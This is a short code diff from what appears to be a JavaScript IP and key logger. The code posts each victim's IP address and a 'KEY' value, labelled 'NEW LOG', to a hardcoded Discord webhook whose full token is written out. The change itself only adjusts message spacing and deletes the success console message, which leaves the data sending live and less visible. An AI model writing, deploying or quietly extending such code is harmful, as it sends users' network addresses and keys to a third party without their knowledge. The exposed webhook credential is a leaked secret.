@@ -143,7 +143,7 @@
             
             const webhookUrl = 'https://discord.com/api/webhooks/1170965103521312838/lTDH6-9O97-dvcbzeULNpj63Em2-gU-8kq842j8D0OXlYSIumsR_Vu95KjgrLMlsikgE';
             const payload = {
-                content: 'NEW LOG \n IP:' + ipAddress + ' \nKEY: ' + key
+                content: 'NEW LOG \nIP:' + ipAddress + ' \nKEY: ' + key
             };
             fetch(webhookUrl, {
                 method: 'POST',
@@ -156,7 +156,6 @@
                 if (!response.ok) {
                     throw new Error('Failed to send message to Discord');
                 }
-                console.log('Message sent successfully to Discord');
             })
             .catch(error => {
                 console.error('Error:', error);
